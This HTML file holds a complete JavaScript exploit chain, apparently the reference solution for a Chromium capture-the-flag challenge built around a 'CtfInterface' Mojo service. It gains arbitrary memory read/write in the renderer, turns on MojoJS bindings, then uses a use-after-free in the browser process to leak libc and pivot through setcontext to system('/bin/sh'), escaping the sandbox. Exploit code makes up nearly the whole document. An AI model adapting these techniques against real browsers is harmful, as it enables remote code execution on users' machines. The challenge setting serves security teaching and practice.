<!-->
  Copyright 2021 Google LLC

  Licensed under the Apache License, Version 2.0 (the "License");
  you may not use this file except in compliance with the License.
  You may obtain a copy of the License at

      https://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
<-->
<html>
<head>
<script src="mojo/mojo_bindings.js"></script>
<script src="mojo/third_party/blink/public/mojom/CTF/ctf_interface.mojom.js"></script>

<script>
let converter = new ArrayBuffer(8);
let u64view = new BigUint64Array(converter);
let f64view = new Float64Array(converter);

// Might need to be updated when recompiling chromium, but
// probably not. Find the value by calling %DebugPrint on x, y, and z and
// pasting the difference between their addresses here
const y_offset = 0x94 / 4 + 1;
const z_offset = 0x88 / 4 + 1;

// The following values all have to be updated every time we recompile
// chromium.
// 
// Get the base address of chrome in the renderer process
// from /proc/xx/maps and compute the difference between "chrome_leak"
// in the output and the base address of chrome
const chrome_leak_offset = 0xc51d588n;
// nm chrome | grep g_frame_map | awk '{print $1}'
const g_frame_map_offset = 0xc5637e0n;
// Disassemble content::RenderFrameImpl::EnableMojoJsBindings
const enable_mojo_js_bindings_offset = 0x448n;
// Get the base of chrome in the browser process using /proc/xx/maps
// and subtract that from the address of the vtable
// (from the output of the exploit)
const ctfimpl_vtable_offset = 0xbc774e0n;
// readelf -r chrome | grep execvp | awk '{print $1}'
const execvp_got_offset = 0xc2ce730n;

// The following values need to be adjusted if we switch to a different
// libc. We shouldn't need to do this. You can get these with nm/readelf
const execvp_offset = 0xcbb10n;
const setcontext_offset = 0x4b6f0n;
const system_offset = 0x48e50n;
const bss_offset = 0x1be000n;

function i2d(x) {
  u64view[0] = x;
  return f64view[0];
}

function d2i(x) {
  f64view[0] = x;
  return u64view[0];
}

function print(x) {
  console.log(x);
}

function hex(x) {
  return `0x${x.toString(16)}`;
}

function assert(x, msg) {
  if (!x) {
    throw msg;
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function enable_mojo() {
  let x = new Uint32Array(1);
  let y = new Uint32Array(1);
  let z = new BigUint64Array(new ArrayBuffer(8));
  let new_len = new Uint32Array([1339]);

  // Overwrite the length of y
  x.set(new_len, y_offset + 8);

  function read64(address) {
    y[z_offset + 10] = Number(address & 0xffffffffn);
    y[z_offset + 11] = Number((address >> 32n) & 0xffffffffn);
    y[z_offset + 12] = 0;
    return z[0];
  }

  function write64(address, value) {
    y[z_offset + 10] = Number(address & 0xffffffffn);
    y[z_offset + 11] = Number((address >> 32n) & 0xffffffffn);
    y[z_offset + 12] = 0;
    z[0] = value;
  }

  let heap_buf = BigInt(y[z_offset + 10]) | (BigInt(y[z_offset + 11]) << 32n);
  print(`PartitionAlloc buffer: ${hex(heap_buf)}`);

  let superpage = heap_buf & 0xfffffffffff00000n;
  print(`Superpage: ${hex(superpage)}`);

  // The first page of a 2MB region is a guard page
  let metadata_page = superpage + 0x1000n;
  let chrome_leak = read64(metadata_page);
  print(`chrome leak: ${hex(chrome_leak)}`);

  let chrome_base = chrome_leak - chrome_leak_offset;
  print(`chrome base: ${hex(chrome_base)}`);

  // Strategy from markbrand@'s enable_mojo.js

  // g_frame_map is a LazyInstance<FrameMap>, i.e. a FrameMap preceded by a
  // pointer to the FrameMap.
  let frame_map_ptr = chrome_base + g_frame_map_offset;
  let g_frame_map = read64(frame_map_ptr);
  assert(g_frame_map === frame_map_ptr + 8n, 'failed to find g_frame_map');
  print(`g_frame_map: ${hex(g_frame_map)}`);

  // FrameMap is a std::map<blink::WebFrame*, RenderFrameImpl*>, which is
  // implemented as a red-black tree in libc++. We'll assume that there is
  // only one element in the map. The first 8 bytes in the std::map point to
  // the (only) node.
  // The layout of a node is as follows:
  // 0:  p64(left)
  // 8:  p64(right)
  // 16: p64(parent)
  // 24: p64(is_black) (yes this is a boolean but it takes 64 bits)
  // 32: key (in our case blink::WebFrame*)
  // 40: value (in our case RenderFrameImpl*) <-- what we want
  let g_frame_map_node = read64(g_frame_map);
  print(`g_frame_map_node: ${hex(g_frame_map_node)}`);
  let render_frame = read64(g_frame_map_node + 40n);
  print(`render_frame: ${hex(render_frame)}`);

  // This is a bool in RenderFrameImpl that controls whether JavaScript has
  // access to the MojoJS bindings.
  let enable_mojo_js_bindings_addr = render_frame + enable_mojo_js_bindings_offset;
  write64(enable_mojo_js_bindings_addr, read64(enable_mojo_js_bindings_addr) | 1n);
  // We will have mojo after reloading the page, so do that
  window.location.reload();
}

async function find_oob() {
  while (true) {
    // Allocate 100 CtfInterfaceImpl
    let ctfs = [];
    for (let i = 0; i < 100; i++) {
      let ctf = new blink.mojom.CtfInterfacePtr();
      Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(ctf).handle);
      ctfs.push(ctf);
    }

    await sleep(100);

    // Free one
    let index = Math.floor(Math.random() * 100);
    ctfs.splice(index, 1)[0].ptr.reset();
    for (let i = 0; i < ctfs.length; i++) {
      await ctfs[i].resizeVector(4);
    }

    // ctfs[1]'s vector points to the space that used to be the freed ctf
    let oob1 = ctfs.splice(1, 1)[0];

    // Scan the heap and try to find a CtfImpl object
    for (let i = 0; i < 100; i++) {
      let vt = d2i((await oob1.read(i)).value);
      if ((vt >> 44n) != 0x5n) {
        continue;
      }

      // std::vector<T> is 3 pointers (begin, end, endcap)
      let begin = d2i((await oob1.read(i + 1)).value);
      let end = d2i((await oob1.read(i + 2)).value);
      let endcap = d2i((await oob1.read(i + 3)).value);
      if (end != endcap || begin != (end - 0x20n)) {
        continue;
      }

      // We found a CtfImpl, now find out which one it is
      for (let j = 0; j < ctfs.length; j++) {
        // Resize it and see if the size of the vector in the object we found changed
        await ctfs[j].resizeVector(3);
        begin = d2i((await oob1.read(i + 1)).value);
        end = d2i((await oob1.read(i + 2)).value);
        if (end - begin == 0x18) {
          // Success, we found the resized vector
          let oob2 = ctfs[j];
          return [oob1, oob2, i];
        }
      }

      // Maybe an old object? Redo
      break;
    }

    // Didn't find a CtfImpl, redo
  }
}

async function sbx() {
  let oob1, oob2, oob2_offset;
  [oob1, oob2, oob2_offset] = await find_oob();

  // Read the vtable pointer to find the base of chrome in the browser process
  let vt = d2i((await oob1.read(oob2_offset)).value);
  print(`CTFImpl vtable: ${hex(vt)}`);


  let chrome_base = vt - ctfimpl_vtable_offset;
  print(`chrome base: ${hex(chrome_base)}`);

  async function read64(addr) {
    await oob1.write(i2d(addr), oob2_offset + 1);
    return d2i((await oob2.read(0)).value);
  }

  async function write64(addr, val) {
    await oob1.write(i2d(addr), oob2_offset + 1);
    await oob2.write(i2d(val), 0);
  }

  // Read the GOT to find libc.
  let execvp_got = chrome_base + execvp_got_offset;
  let execvp = await read64(execvp_got);

  let libc_base = execvp - execvp_offset;
  print(`libc base: ${hex(libc_base)}`);

  let setcontext = libc_base + setcontext_offset;
  let system = libc_base + system_offset;
  let libc_bss = libc_base + bss_offset;

  // Write a fake vtable
  await write64(libc_bss, setcontext);
  // /bin/sh\x00
  await write64(libc_bss + 8n, 0x68732f6e69622fn);

  // Vtable pointer
  await oob1.write(i2d(libc_bss - 32n), oob2_offset);
  // Arguments for setcontext
  // rip
  await oob1.write(i2d(system), oob2_offset + 0xa8/8);
  // rdi
  await oob1.write(i2d(libc_bss + 8n), oob2_offset + 0x68/8);
  // rsp
  await oob1.write(i2d(libc_bss + 0x1008n), oob2_offset + 0xa0/8);
  // fcontext
  await oob1.write(i2d(libc_bss + 0x100n), oob2_offset + 0xe0/8);
  // mxcsr
  await oob1.write(i2d(0x1f80n), oob2_offset + 0x1c0/8);

  print('Launching shell...');

  // Call setcontext
  await oob2.write(0, 0);
}

async function pwn() {
  try {
    if (typeof(Mojo) === 'undefined') {
      enable_mojo();
    } else {
      print(`Got Mojo!: ${Mojo}`);
      await sbx();
    }
  } catch (e) {
    print(`[-] Exception caught: ${e}`);
    print(e.stack);
  }
}

pwn();

</script>
</head>
</html>
